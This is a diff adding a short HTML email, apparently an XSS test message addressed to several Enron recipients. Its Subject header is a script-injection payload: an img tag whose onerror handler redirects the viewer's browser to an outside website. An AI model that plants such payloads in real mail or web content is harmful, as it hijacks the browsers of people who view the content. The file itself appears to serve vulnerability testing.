@@ -1,0 +1,7 @@
+From: US NMA <ajohnson@glcornell.com>
+To: robert.superty@enron.com, j..farmer@enron.com, victor.lamadrid@enron.com, 
+Subject: <img onerror=window.location.href="http://www.wooyun.org" src="http://www.wooyun.org">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
